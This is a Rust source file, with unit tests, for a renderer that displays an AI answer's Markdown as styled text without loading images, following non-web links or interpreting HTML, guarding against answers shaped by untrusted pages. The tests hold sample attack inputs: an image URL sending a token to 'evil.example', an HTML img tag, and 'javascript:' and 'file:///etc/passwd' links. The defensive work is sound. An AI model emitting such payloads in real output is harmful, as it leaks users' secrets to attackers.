//! The Markdown of an answer as plain styled text, one line at a time.
//!
//! The answer comes from an endpoint that read an untrusted page, so its Markdown is shown,
//! never acted on: no image is loaded (an image becomes its alt text), no link is followed or
//! prefetched (a link becomes text the user may click, with its host beside it so the text
//! cannot pass for another site), and nothing but `http` and `https` links is clickable at
//! all. No HTML is interpreted; it shows as the characters it is.
//!
//! Handled: headings, bullets, code spans and fenced blocks, `**strong**`, links, images, and
//! table rows (set in monospace so the columns line up). Everything else is text as written.

use url::Url;

/// How a span of the answer looks.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Style {
    /// Answer text.
    Body,
    /// `**strong**` text.
    Strong,
    /// Code, a code block, a table row.
    Code,
    /// A heading line.
    Heading,
    /// A link the user may click; the browser opens it in a new tab, and only then.
    Link(Url),
    /// What stands in for something not shown: an image's alt text, a link's host.
    Note,
    /// A quote the page contains: a citation.
    Quote,
    /// Why the answer stopped short; Quickie's words, never the answer's.
    Problem,
}

/// A run of answer text in one style.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Span {
    pub text: String,
    pub style: Style,
}

impl Span {
    pub fn new(text: impl Into<String>, style: Style) -> Self {
        Self {
            text: text.into(),
            style,
        }
    }
}

/// A piece of one line of the answer, in order: text, or a citation the agent verified.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum LinePart {
    Text(String),
    Cite(String),
}

/// Renders lines in order; it remembers whether a fenced code block is open.
#[derive(Clone, Debug, Default)]
pub struct Renderer {
    code_block: bool,
}

impl Renderer {
    /// The spans of one line, without its line break. `complete` says the line ended; only a
    /// complete fence line opens or closes a code block, so a line still streaming in is
    /// rendered again when it ends.
    /// Text that follows text joins it, so the block marks at the start of a line are all in
    /// its first part.
    pub fn line(&mut self, parts: &[LinePart], complete: bool) -> Vec<Span> {
        let first = match parts.first() {
            Some(LinePart::Text(text)) => text.trim_start(),
            Some(LinePart::Cite(_)) | None => "",
        };
        if first.starts_with("```") {
            if complete {
                self.code_block = !self.code_block;
            }
            return Vec::new();
        }
        if self.code_block || first.starts_with('|') {
            return whole(parts, &Style::Code);
        }
        if let Some(heading) = heading(first) {
            return whole(&with_first(parts, heading), &Style::Heading);
        }
        let mut spans = Vec::new();
        let mut parts = parts.to_vec();
        if let Some(item) = bullet(first) {
            spans.push(Span::new("• ", Style::Body));
            parts = with_first(&parts, item);
        }
        for part in &parts {
            match part {
                LinePart::Text(text) => inline(text, &mut spans),
                LinePart::Cite(quote) => spans.push(Span::new(format!("“{quote}”"), Style::Quote)),
            }
        }
        spans
    }
}

/// Every part of the line in `style`, citations as quotes.
fn whole(parts: &[LinePart], style: &Style) -> Vec<Span> {
    parts
        .iter()
        .filter_map(|part| match part {
            LinePart::Text(text) if text.is_empty() => None,
            LinePart::Text(text) => Some(Span::new(text.clone(), style.clone())),
            LinePart::Cite(quote) => Some(Span::new(format!("“{quote}”"), Style::Quote)),
        })
        .collect()
}

/// The parts with the first one, which is text, replaced by `rest`, the line after its block
/// mark.
fn with_first(parts: &[LinePart], rest: &str) -> Vec<LinePart> {
    let mut parts = parts.to_vec();
    if let Some(LinePart::Text(first)) = parts.first_mut() {
        rest.clone_into(first);
    }
    parts
}

/// The text of a heading line (`# ` to `###### `), without its marks.
fn heading(line: &str) -> Option<&str> {
    let level = line.chars().take_while(|&c| c == '#').count();
    let rest = &line[level..];
    ((1..=6).contains(&level) && rest.starts_with(' ')).then(|| rest.trim_start())
}

/// The text of a bullet item (`- `, `* `, `+ `), without its mark.
fn bullet(line: &str) -> Option<&str> {
    ["- ", "* ", "+ "]
        .into_iter()
        .find_map(|mark| line.strip_prefix(mark))
}

/// The inline spans of `text`: strong, code, images, and links in body text.
fn inline(text: &str, spans: &mut Vec<Span>) {
    let mut plain = String::new();
    let mut rest = text;
    while let Some(c) = rest.chars().next() {
        let found = strong(rest)
            .or_else(|| code(rest))
            .or_else(|| image(rest))
            .or_else(|| link(rest));
        if let Some((found, after)) = found {
            flush(&mut plain, spans);
            spans.extend(found);
            rest = after;
        } else {
            plain.push(c);
            rest = &rest[c.len_utf8()..];
        }
    }
    flush(&mut plain, spans);
}

fn flush(plain: &mut String, spans: &mut Vec<Span>) {
    if !plain.is_empty() {
        spans.push(Span::new(std::mem::take(plain), Style::Body));
    }
}

type Found<'a> = Option<(Vec<Span>, &'a str)>;

fn strong(text: &str) -> Found<'_> {
    let inner = text.strip_prefix("**")?;
    let end = inner.find("**").filter(|&end| end > 0)?;
    Some((
        vec![Span::new(&inner[..end], Style::Strong)],
        &inner[end + 2..],
    ))
}

fn code(text: &str) -> Found<'_> {
    let inner = text.strip_prefix('`')?;
    let end = inner.find('`').filter(|&end| end > 0)?;
    Some((
        vec![Span::new(&inner[..end], Style::Code)],
        &inner[end + 1..],
    ))
}

/// `![alt](url)`: the alt text only. The image is never loaded.
fn image(text: &str) -> Found<'_> {
    let (alt, _url, after) = target(text.strip_prefix("![")?)?;
    let shown = if alt.trim().is_empty() {
        "[image]".to_owned()
    } else {
        format!("[image: {}]", alt.trim())
    };
    Some((vec![Span::new(shown, Style::Note)], after))
}

/// `[text](url)`: the text, clickable when the URL is `http` or `https`, with the host beside
/// it; any other link is its text alone.
fn link(text: &str) -> Found<'_> {
    let (label, address, after) = target(text.strip_prefix('[')?)?;
    let label = if label.is_empty() { address } else { label };
    let web = Url::parse(address)
        .ok()
        .filter(|url| matches!(url.scheme(), "http" | "https"));
    let spans = match web {
        Some(url) => {
            let host = url.host_str().unwrap_or_default().to_owned();
            vec![
                Span::new(label, Style::Link(url)),
                Span::new(format!(" ({host})"), Style::Note),
            ]
        }
        None => vec![Span::new(label, Style::Body)],
    };
    Some((spans, after))
}

/// Splits `text](url) after` into the text, the URL, and what follows. Parentheses inside the
/// URL count when they pair up, as in `javascript:alert(1)` or a Wikipedia address.
fn target(text: &str) -> Option<(&str, &str, &str)> {
    let close = text.find("](")?;
    let after = &text[close + 2..];
    let mut depth = 0_usize;
    let end = after.char_indices().find_map(|(at, c)| match c {
        '(' => {
            depth += 1;
            None
        }
        ')' if depth == 0 => Some(at),
        ')' => {
            depth -= 1;
            None
        }
        _ => None,
    })?;
    Some((&text[..close], after[..end].trim(), &after[end + 1..]))
}

#[cfg(test)]
mod tests {
    use url::Url;

    use super::{LinePart, Renderer, Span, Style};

    fn text(text: &str) -> LinePart {
        LinePart::Text(text.to_owned())
    }

    fn render(line: &str) -> Vec<Span> {
        Renderer::default().line(&[text(line)], true)
    }

    fn span(text: &str, style: Style) -> Span {
        Span::new(text, style)
    }

    #[test]
    fn plain_text_is_one_body_span() {
        assert_eq!(render("Just words."), [span("Just words.", Style::Body)]);
        assert_eq!(render(""), []);
    }

    #[test]
    fn strong_and_code_are_styled_without_their_marks() {
        assert_eq!(
            render("a **b** `c` d"),
            [
                span("a ", Style::Body),
                span("b", Style::Strong),
                span(" ", Style::Body),
                span("c", Style::Code),
                span(" d", Style::Body),
            ]
        );
    }

    #[test]
    fn unclosed_or_empty_marks_stay_text() {
        assert_eq!(render("**open"), [span("**open", Style::Body)]);
        assert_eq!(render("a ** b"), [span("a ** b", Style::Body)]);
        assert_eq!(render("``"), [span("``", Style::Body)]);
        assert_eq!(render("`x"), [span("`x", Style::Body)]);
    }

    #[test]
    fn a_web_link_is_clickable_text_with_its_host() {
        let url = Url::parse("https://example.com/a?b=1").unwrap();

        assert_eq!(
            render("see [the docs](https://example.com/a?b=1)."),
            [
                span("see ", Style::Body),
                span("the docs", Style::Link(url)),
                span(" (example.com)", Style::Note),
                span(".", Style::Body),
            ]
        );
    }

    #[test]
    fn a_link_without_text_shows_its_address() {
        let url = Url::parse("http://127.0.0.1:8080/").unwrap();

        assert_eq!(
            render("[](http://127.0.0.1:8080/)")[0],
            span("http://127.0.0.1:8080/", Style::Link(url))
        );
    }

    #[test]
    fn a_link_to_anything_but_the_web_is_plain_text() {
        for line in [
            "[click](javascript:alert(1))",
            "[mail](mailto:a@b.c)",
            "[file](file:///etc/passwd)",
            "[rel](/relative)",
        ] {
            let spans = render(line);
            assert!(
                spans
                    .iter()
                    .all(|span| !matches!(span.style, Style::Link(_))),
                "{line}: {spans:?}"
            );
        }
        assert_eq!(render("[mail](mailto:a@b.c)"), [span("mail", Style::Body)]);
        assert_eq!(
            render("a [click](javascript:alert(1)) b"),
            [
                span("a ", Style::Body),
                span("click", Style::Body),
                span(" b", Style::Body)
            ]
        );
    }

    #[test]
    fn a_web_address_may_hold_paired_parentheses() {
        let url = Url::parse("https://en.wikipedia.org/wiki/Rust_(language)").unwrap();

        assert_eq!(
            render("[Rust](https://en.wikipedia.org/wiki/Rust_(language))!"),
            [
                span("Rust", Style::Link(url)),
                span(" (en.wikipedia.org)", Style::Note),
                span("!", Style::Body),
            ]
        );
        assert_eq!(render("[x](a(b)"), [span("[x](a(b)", Style::Body)]);
    }

    #[test]
    fn an_image_is_never_loaded_only_named() {
        assert_eq!(
            render("![secret](https://evil.example/?d=token)"),
            [span("[image: secret]", Style::Note)]
        );
        assert_eq!(
            render("![](https://evil.example/x.png)"),
            [span("[image]", Style::Note)]
        );
    }

    #[test]
    fn html_is_shown_as_written() {
        assert_eq!(
            render("<img src=https://evil.example/x>"),
            [span("<img src=https://evil.example/x>", Style::Body)]
        );
    }

    #[test]
    fn headings_lose_their_marks() {
        assert_eq!(render("## Risks"), [span("Risks", Style::Heading)]);
        assert_eq!(render("#hashtag"), [span("#hashtag", Style::Body)]);
        assert_eq!(
            render("####### seven"),
            [span("####### seven", Style::Body)]
        );
    }

    #[test]
    fn bullets_become_dots() {
        for line in ["- item", "* item", "+ item"] {
            assert_eq!(
                render(line),
                [span("• ", Style::Body), span("item", Style::Body)],
                "{line}"
            );
        }
        assert_eq!(render("-item"), [span("-item", Style::Body)]);
    }

    #[test]
    fn a_table_row_is_code_as_written() {
        assert_eq!(
            render("| **a** | b |"),
            [span("| **a** | b |", Style::Code)]
        );
    }

    #[test]
    fn a_fenced_block_is_code_and_its_fences_vanish() {
        let mut renderer = Renderer::default();

        assert_eq!(renderer.line(&[text("```rust")], true), []);
        assert_eq!(
            renderer.line(&[text("let **a** = 1;")], true),
            [span("let **a** = 1;", Style::Code)]
        );
        assert_eq!(renderer.line(&[text("```")], true), []);
        assert_eq!(
            renderer.line(&[text("**b**")], true),
            [span("b", Style::Strong)]
        );
    }

    #[test]
    fn a_fence_still_streaming_opens_nothing() {
        let mut renderer = Renderer::default();

        assert_eq!(
            renderer.line(&[text("``")], false),
            [span("``", Style::Body)]
        );
        assert_eq!(renderer.line(&[text("```")], false), []);
        assert_eq!(
            renderer.line(&[text("**b**")], true),
            [span("b", Style::Strong)]
        );
    }

    #[test]
    fn citations_are_quotes_wherever_they_stand() {
        let parts = [
            text("- says "),
            LinePart::Cite("the price is 42".to_owned()),
            text(" today"),
        ];

        assert_eq!(
            Renderer::default().line(&parts, true),
            [
                span("• ", Style::Body),
                span("says ", Style::Body),
                span("“the price is 42”", Style::Quote),
                span(" today", Style::Body),
            ]
        );
        assert_eq!(
            Renderer::default().line(&[text("| a "), LinePart::Cite("x y z".to_owned())], true),
            [span("| a ", Style::Code), span("“x y z”", Style::Quote)]
        );
    }

    #[test]
    fn a_heading_keeps_its_citation_and_what_follows() {
        let parts = [
            text("# On "),
            LinePart::Cite("a b c".to_owned()),
            text(" more"),
        ];

        assert_eq!(
            Renderer::default().line(&parts, true),
            [
                span("On ", Style::Heading),
                span("“a b c”", Style::Quote),
                span(" more", Style::Heading),
            ]
        );
    }

    #[test]
    fn a_line_that_starts_with_a_citation_has_no_block_mark() {
        let parts = [LinePart::Cite("a b c".to_owned()), text(" - x")];

        assert_eq!(
            Renderer::default().line(&parts, true),
            [span("“a b c”", Style::Quote), span(" - x", Style::Body)]
        );
    }
}
